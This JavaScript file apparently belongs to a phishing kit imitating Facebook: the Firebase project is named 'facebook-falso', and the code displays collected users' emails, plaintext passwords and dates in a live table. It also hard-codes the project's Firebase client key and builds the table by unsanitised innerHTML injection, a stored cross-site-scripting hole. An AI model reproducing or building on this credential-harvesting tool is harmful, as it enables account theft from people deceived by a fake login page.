

// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyCVic6mZJ9q8YwLm40rxRKgrw6pVVy1zpI",
    authDomain: "facebook-falso.firebaseapp.com",
    databaseURL: "https://facebook-falso.firebaseio.com",
    projectId: "facebook-falso",
    storageBucket: "facebook-falso.appspot.com",
    messagingSenderId: "784618832689",
    appId: "1:784618832689:web:7aadc49dc2db5e099a6610"
};

firebase.initializeApp(firebaseConfig);


var db = firebase.firestore();

// Add a new document in collection "cities"

var contador=0;
var tabla=document.getElementById("tabla");
db.collection("Usuarios").onSnapshot((querySnapshot) => {
    contador=0;
    tabla.innerHTML='';
    querySnapshot.forEach((doc) => {
        contador++;
        console.log(`${doc.id} => ${doc.data()}`);
        tabla.innerHTML+=`
        <tr>
        <th scope="row">${contador}</th>
        <td>${doc.data().correo}</td>
        <td>${doc.data().password}</td>
        <td>${doc.data().fecha}</td>
      </tr>`
    });
});